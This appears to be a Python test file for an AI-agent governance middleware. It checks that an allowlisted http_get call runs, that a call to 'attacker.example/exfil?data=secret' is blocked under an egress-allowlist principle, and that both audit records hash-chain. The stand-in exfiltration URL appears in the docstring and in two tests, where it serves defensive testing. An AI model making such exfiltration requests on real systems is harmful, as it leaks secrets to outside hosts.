"""End-to-end vertical slice — the Walking Skeleton proof-of-life (INT-01/SDK-01/D-01/D-03).

The full hot path, exercised against the SQLite-backed Store (D-14, no Docker):

    ToolCallRequest -> GovernanceMiddleware.awrap_tool_call -> normalize ->
    Pipeline.evaluate (identity -> enrichment -> policy(constitution WASM) -> risk
    -> graduated) -> allow (handler runs) | deny (handler NOT called) + one
    hash-chained AuditRecord.

Driving choice (documented per the plan): we drive the middleware DIRECTLY with a
constructed `ToolCallRequest` rather than spinning up a real LLM via `create_agent`.
The seam under test is the PEP->PDP->audit loop and the allow/deny enforcement; a real
model would add a network/provider dependency and nondeterminism without exercising any
additional governed code path (the middleware is model-agnostic — it sees only the
tool-call request). `create_agent(model=..., tools=[http_get], middleware=[...])` is the
documented production attach point (RESEARCH § Interception); it is not needed to prove
the slice.

Two records, two outcomes, one chain:
  - allowlisted https://api.example.com/... -> the tool runs, outcome allow, 1 audit row;
  - attacker   https://attacker.example/exfil?data=... -> blocked (handler not called),
    outcome deny, audit row citing fired principle 1.1;
  - the two records hash-chain (second.prev_hash == first.record_hash).
"""

import asyncio

from langchain.agents.middleware import ToolCallRequest
from langchain.messages import ToolMessage
from sqlalchemy import select

from agentos_contract import Outcome
from agentos_controlplane.store.models import AuditRecord
from agentos_sdk import GovernanceMiddleware


def _request(url: str, fetched_content: str = "", call_id: str = "call_e2e") -> ToolCallRequest:
    """A LangChain tool-call request for http_get carrying the page body it fetched."""
    return ToolCallRequest(
        tool_call={
            "name": "http_get",
            "args": {"url": url, "content": fetched_content},
            "id": call_id,
        },
        tool=None,
        state=None,
        runtime=None,
    )


class _SpyHandler:
    """Stands in for the real tool runner; records whether the tool actually ran."""

    def __init__(self) -> None:
        self.calls = 0

    async def __call__(self, request: ToolCallRequest):
        self.calls += 1  # the governed `http_get` would perform real egress HERE
        return ToolMessage(content="<fetched body>", tool_call_id=request.tool_call["id"])


def _audit_rows(wired) -> list[AuditRecord]:
    factory = wired.pipeline._audit.session_factory
    with factory() as session:
        return list(session.scalars(select(AuditRecord).order_by(AuditRecord.seq)))


def test_allow_runs_tool_and_appends_one_audit_record(pipeline_with_principle) -> None:
    wired = pipeline_with_principle
    mw = GovernanceMiddleware(wired.pipeline, wired.token)
    handler = _SpyHandler()

    result = asyncio.run(
        mw.awrap_tool_call(_request("https://api.example.com/data"), handler)
    )

    assert handler.calls == 1  # the allowlisted fetch actually ran
    assert isinstance(result, ToolMessage)
    rows = _audit_rows(wired)
    assert len(rows) == 1
    assert rows[0].body["outcome"] == Outcome.allow.value


def test_attacker_fetch_is_blocked_and_audited(pipeline_with_principle) -> None:
    wired = pipeline_with_principle
    mw = GovernanceMiddleware(wired.pipeline, wired.token)
    handler = _SpyHandler()

    result = asyncio.run(
        mw.awrap_tool_call(
            _request("https://attacker.example/exfil?data=secret", call_id="call_attack"),
            handler,
        )
    )

    assert handler.calls == 0  # NO egress: the tool never executed (D-03)
    assert isinstance(result, ToolMessage)
    assert result.tool_call_id == "call_attack"
    rows = _audit_rows(wired)
    assert len(rows) == 1
    assert rows[0].body["outcome"] == Outcome.deny.value
    # The fired constitution principle (1.1 egress allowlist) is cited with provenance.
    assert any(
        r["code"] == "constitution_principle_fired" and r["principle_ref"] == "1.1"
        for r in rows[0].body["reasons"]
    )


def test_allow_then_deny_audit_records_hash_chain(pipeline_with_principle) -> None:
    """The whole slice in one chain: allow record then deny record, linked by prev_hash."""
    wired = pipeline_with_principle
    mw = GovernanceMiddleware(wired.pipeline, wired.token)
    handler = _SpyHandler()

    allow_result = asyncio.run(
        mw.awrap_tool_call(
            _request("https://api.example.com/data", call_id="call_allow"), handler
        )
    )
    deny_result = asyncio.run(
        mw.awrap_tool_call(
            _request("https://attacker.example/exfil?data=secret", call_id="call_deny"),
            handler,
        )
    )

    assert handler.calls == 1  # allow ran the tool once; deny did NOT

    rows = _audit_rows(wired)
    assert [r.seq for r in rows] == [0, 1]
    assert rows[0].body["outcome"] == Outcome.allow.value
    assert rows[1].body["outcome"] == Outcome.deny.value
    # The chain links: the deny record points back at the allow record's hash.
    assert rows[0].prev_hash is None  # genesis
    assert rows[1].prev_hash == rows[0].record_hash
    # Each Decision's evidence_ref points at its appended record.
    assert allow_result.tool_call_id == "call_allow"
    assert deny_result.tool_call_id == "call_deny"
